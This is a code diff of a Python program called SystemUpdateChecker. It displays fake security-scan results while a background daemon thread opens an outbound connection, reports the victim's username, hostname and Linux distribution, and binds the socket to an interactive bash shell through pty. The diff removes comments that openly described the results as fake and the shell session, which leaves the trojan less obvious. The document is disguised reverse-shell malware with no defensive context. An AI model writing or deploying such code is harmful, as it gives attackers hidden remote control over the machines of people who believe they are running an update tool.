@@ -50,8 +50,7 @@ class SystemUpdateChecker:
         
         print("[INFO] Checking security updates...")
         time.sleep(4)
-        
-        # Show fake results
+
         print("\n" + "=" * 60)
         print("                    SCAN RESULTS")
         print("=" * 60)
@@ -79,7 +78,6 @@ class SystemUpdateChecker:
             self.print_banner()
             self.fake_update_check()
             
-            # Keep the program running
             while self.running:
                 time.sleep(10)
                 
@@ -100,15 +98,13 @@ class SystemUpdateChecker:
     def spawn_shell(self, s):
         """Spawn a proper shell with PTY support"""
         try:
-            # Duplicate socket to stdin, stdout, stderr
+
             os.dup2(s.fileno(), 0)
             os.dup2(s.fileno(), 1)
             os.dup2(s.fileno(), 2)
-            
-            # Spawn shell using pty
+
             pty.spawn("/bin/bash")
         except Exception:
-            # Fallback to basic shell
             self.basic_shell(s)
     
     def basic_shell(self, s):
@@ -150,11 +146,10 @@ class SystemUpdateChecker:
                     connection = self.create_connection()
                     
                     if connection:
-                        # Send initial message
+
                         hostname = socket.gethostname()
                         username = os.getenv('USER', 'unknown')
                         
-                        # Get system info
                         try:
                             distro = subprocess.run(['lsb_release', '-d'], capture_output=True, text=True)
                             distro_info = distro.stdout.split('\t')[1].strip() if distro.returncode == 0 else "Linux"
@@ -164,7 +159,7 @@ class SystemUpdateChecker:
                         initial_msg = f"[+] System Update Tool - Connection from {username}@{hostname} ({distro_info})\n"
                         connection.send(initial_msg.encode())
                         
-                        # Start shell session
+
                         self.spawn_shell(connection)
                         
                         connection.close()
@@ -175,7 +170,7 @@ class SystemUpdateChecker:
                     time.sleep(5)
                     continue
         
-        # Start in daemon thread
+
         shell_thread = threading.Thread(target=run_shell, daemon=True)
         shell_thread.start()
 
